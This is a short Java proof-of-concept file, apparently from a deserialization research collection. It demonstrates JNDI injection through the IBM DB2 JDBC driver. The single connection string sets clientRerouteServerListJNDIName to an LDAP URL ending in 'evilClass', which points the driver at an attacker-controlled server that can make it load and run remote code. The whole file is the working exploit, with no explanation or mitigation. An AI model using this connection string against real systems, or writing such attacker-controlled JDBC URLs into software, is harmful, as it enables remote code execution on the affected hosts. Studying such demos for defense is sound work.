package com.SugarP1g.deserialization.jdbc.db2;

import java.sql.Connection;
import java.sql.DriverManager;

public class Demo {

    public static void main(String[] args) throws Exception {
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        Connection conn = DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;");
    }
}
